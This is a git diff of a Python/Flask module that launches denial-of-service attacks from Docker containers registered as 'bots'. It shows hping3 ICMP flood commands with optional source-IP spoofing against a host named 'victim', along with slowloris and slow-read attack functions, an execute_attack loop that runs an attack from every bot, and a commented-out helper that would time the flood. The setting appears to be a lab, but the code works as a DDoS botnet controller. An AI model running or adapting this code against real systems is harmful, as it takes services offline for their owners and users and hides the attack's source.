@@ -1,4 +1,4 @@
-import docker, threading, sqlite3
+import docker, threading, sqlite3, time
 from flask import request
 from .settings import client
 
@@ -9,16 +9,17 @@ def ping(container_id):
     print(result.output.decode())
 
 
-def icmp_flood(container_id, ip_address):
+def icmp_flood(container_id, ip_address, duration):
     container = client.containers.get(container_id)
-    if ip_address:
+    if ip_address: # If user wants to spoof src IP
         result = container.exec_run(
             f"hping3 -p 80 --icmp --flood -a {ip_address} victim"
         )
     else:
         result = container.exec_run("hping3 -p 80 --icmp --flood victim")
-    # result = container.exec_run(f"hping3 {ip_address} -p 80 --icmp --flood victim")
+#        hping_duration(duration, container_id)
     print(result.output.decode())
+
 
 
 def slowloris(container_id, number_of_connections, connection_rate, attack_duration):
@@ -36,7 +37,7 @@ def slow_read(container_id, number_of_connections, connection_rate, attack_durat
     print(result.output.decode())
 
 
-def execute_attack(attack, *args):
+def execute_attack(attack, *args): 
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
     cursor.execute("SELECT container_id FROM bots")
@@ -57,8 +58,14 @@ def execute_attack(attack, *args):
     conn.close()
     return "Attack finished"
 
-
 def stop_attack(container_id):
     container = client.containers.get(container_id)
     result = container.exec_run("pkill hping3")
     print(result.output.decode())
+
+
+# def hping_duration(container_id, duration): # Hping3 itself doesnt have flag for duration set, this is for it
+#     while duration > 0:
+#             time.sleep(1)
+#             duration -= 1
+#     stop_attack(container_id)
